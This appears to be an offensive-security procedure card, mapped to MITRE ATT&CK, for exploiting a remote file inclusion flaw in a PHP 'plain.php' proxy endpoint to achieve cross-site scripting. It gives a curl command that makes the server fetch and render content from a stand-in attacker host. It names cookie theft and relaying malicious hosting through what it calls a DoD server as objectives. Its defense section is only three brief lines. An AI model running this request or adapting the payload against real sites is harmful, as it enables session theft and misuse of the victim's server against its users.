---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
name: Include-External-Malicious-Content-via-RFI
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:02.660Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - rfi
  - xss
commands: []
platforms:
  - Web
tools: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---

# Include-External-Malicious-Content-via-RFI

## Summary

This procedure exploits the RFI vulnerability in the plain.php endpoint by supplying an external URL via the 'url' parameter, causing the server to fetch and render malicious HTML/JavaScript, resulting in XSS execution.

## Description

The plain.php functionality lacks restrictions on external URLs, allowing arbitrary content inclusion. By appending parameters like operation=GetParameterInfo, the endpoint processes and renders the fetched content directly, executing embedded scripts in the page context. This leads to impacts like cookie theft and enables malicious hosting through the DoD server. Target is a PHP-based web app; no auth needed.

## Requirements

1. Accessible plain.php endpoint (e.g., http://target/proxys/plain.php)
2. Hosted malicious content from Step 1
3. Browser or curl for testing inclusion

## Defense

Defensive measures and detection strategies:

- Validate and whitelist allowed URLs in inclusion logic
- Sanitize rendered content to prevent script execution
- Log and alert on external URL fetches

## Objectives

1. Include and render external malicious content
2. Execute XSS for data exfiltration
3. Relay malicious hosting via target server

## Instructions

### Step 1: Craft RFI URL

**Context**: Build the request URL with the malicious external source.

**Command** (Browser or curl):
```bash
curl "http://target/proxys/plain.php?url=http://attacker-ip/t.html&operation=GetParameterInfo&parameter=countryBoundaryLayer&outputFormat=JSON"
```

> The server fetches http://attacker-ip/t.html and renders it. Expected: Page shows executed XSS alerts.

### Step 2: Observe Execution

**Context**: Verify XSS in browser context.

Access the full URL in a browser to see alerts like document.cookie or 'jutsuce'.

> Success if scripts run in target's domain.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- rfi
- xss
